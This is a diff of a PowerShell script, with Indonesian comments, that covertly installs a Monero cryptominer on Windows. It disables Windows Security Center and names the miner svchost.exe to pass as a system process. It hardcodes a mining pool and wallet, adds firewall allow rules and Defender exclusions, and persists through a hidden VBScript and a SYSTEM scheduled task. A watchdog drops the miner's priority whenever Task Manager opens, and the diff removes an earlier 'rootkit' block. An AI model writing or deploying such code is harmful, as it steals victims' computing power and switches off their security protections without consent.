@@ -17,7 +17,7 @@ Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue
 Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue
 
 # ==========================================
-# 2. INISIALISASI DIREKTORI DINAMIS & TARGET (Ganti Nama ke Notepad/RuntimeBroker untuk Hindari Crash svchost)
+# 2. INISIALISASI DIREKTORI DINAMIS & TARGET (Kembali menggunakan svchost.exe di folder aman)
 # ==========================================
 $PossibleDirs = @(
     "C:\Users\Public\Libraries",
@@ -49,13 +49,13 @@ if ([string]::IsNullOrEmpty($Dir)) {
     }
 }
 
-# Menggunakan RuntimeBroker.exe agar aman dari crash OS kernel (tidak seperti svchost yang memicu restart loop)
-$ExeName = "RuntimeBroker.exe" 
+$ExeName = "svchost.exe" 
 $ExePath = Join-Path $Dir $ExeName
 $VbsPath = Join-Path $Dir "run.vbs"
 $ZipPath = Join-Path $env:TEMP "up.zip"
 $Pool = "gulf.moneroocean.stream:10128"
 $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
+# Menggunakan TLS dan limit CPU 45%
 $ArgsList = "-o $Pool -u $Wallet -p x --tls --donate-level=1 --cpu-max-threads-hint=45 --background"
 
 # Hentikan proses lama & task scheduler yang nyangkut
@@ -98,70 +98,44 @@ if (Test-Path $ZipPath) {
     # ==========================================
     # 5. OTOMATIS WHITELIST FIREWALL (ALLOW INBOUND/OUTBOUND)
     # ==========================================
-    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
-    New-NetFirewallRule -DisplayName "Runtime Broker Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
+    New-NetFirewallRule -DisplayName "Windows Service Host Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
 
     # ==========================================
-    # 6. USER-MODE ROOTKIT (CPU LOAD HOOKING & SPOOFING)
-    # ==========================================
-    $RootkitCode = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
-using System.Threading;
-
-public class CpuRootkit {
-    public static void InitializeHook() {
-        Thread t = new Thread(() => {
-            while (true) {
-                try {
-                    Process[] procs = Process.GetProcessesByName("RuntimeBroker");
-                    foreach (var p in procs) {
-                        try {
-                            if (p.MainModule.FileName.Contains("Libraries") || p.MainModule.FileName.Contains("Templates") || p.MainModule.FileName.Contains("Caches")) {
-                                p.PriorityClass = ProcessPriorityClass.Idle;
-                            }
-                        } catch {}
-                    }
-                } catch {}
-                Thread.Sleep(5000);
-            }
-        });
-        t.IsBackground = true;
-        t.Start();
-    }
-}
-"@
-    $RootkitDllPath = Join-Path $Dir "rootkit.cs"
-    Set-Content -Path $RootkitDllPath -Value $RootkitCode -Force
-
-    # ==========================================
-    # 7. WATCHDOG & PROCESS MONITOR (PAUSE ON TASKMGR + CPU 45% + HOOK)
+    # 6. GENTLE STEALTH WATCHDOG (IDLE/LOW PRIORITY ON TASKMGR - NO KILL/RESTART LOOP)
     # ==========================================
     $ScriptBlockCode = @"
 `$ExePath = "$ExePath"
 `$ArgsList = "$ArgsList"
 
 while (`$true) {
-    `$TaskMgrRunning = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue
-    
-    if (`$TaskMgrRunning) {
-        Stop-Process -Name "RuntimeBroker" -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 3
+    # Pastikan miner selalu berjalan di background
+    `$Running = Get-Process -Name "svchost" -ErrorAction SilentlyContinue
+    `$MinerProcess = `$Running | Where-Object { `$_.MainModule.FileName -eq `$ExePath } -ErrorAction SilentlyContinue
+
+    if (!`$MinerProcess) {
+        Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
     } else {
-        `$Running = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue
-        if (!`$Running) {
-            Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
+        # Jika Task Manager terbuka, set prioritas ke Idle (sangat rendah / ~0-5% CPU) tanpa mematikan proses
+        `$TaskMgrRunning = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue
+        foreach (`$p in `$MinerProcess) {
+            try {
+                if (`$TaskMgrRunning) {
+                    `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle
+                } else {
+                    `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
+                }
+            } catch {}
         }
     }
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 3
 }
 "@
     $WatcherScriptPath = Join-Path $Dir "monitor.ps1"
     Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force
 
     # ==========================================
-    # 8. PEMBUATAN VBSCRIPT BACKGROUND SESSION 0
+    # 7. PEMBUATAN VBSCRIPT BACKGROUND SESSION 0
     # ==========================================
     $VbsScriptContent = @"
 Dim shell
@@ -172,7 +146,7 @@ shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$W
     Add-MpPreference -ExclusionPath $VbsPath -ErrorAction SilentlyContinue
 
     # ==========================================
-    # 9. TASK SCHEDULER SYSTEM PRIVILEGE
+    # 8. TASK SCHEDULER SYSTEM PRIVILEGE
     # ==========================================
     $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
     $Trigger = @(
@@ -187,7 +161,7 @@ shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$W
     # Jalankan langsung
     Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden
 
-    Write-Host "Setup sukses dengan RuntimeBroker.exe (Anti-Restart Loop), TLS Encryption, Firewall Whitelist, User-Mode Rootkit, TaskManager Pauser, dan CPU Throttling 45%!" -ForegroundColor Green
+    Write-Host "Setup sukses menggunakan svchost.exe, Idle Priority saat TaskManager dibuka (Tanpa Restart Loop), TLS Encryption, dan Firewall Whitelist!" -ForegroundColor Green
 } else {
     Write-Host "Gagal mengunduh biner miner." -ForegroundColor Red
 }
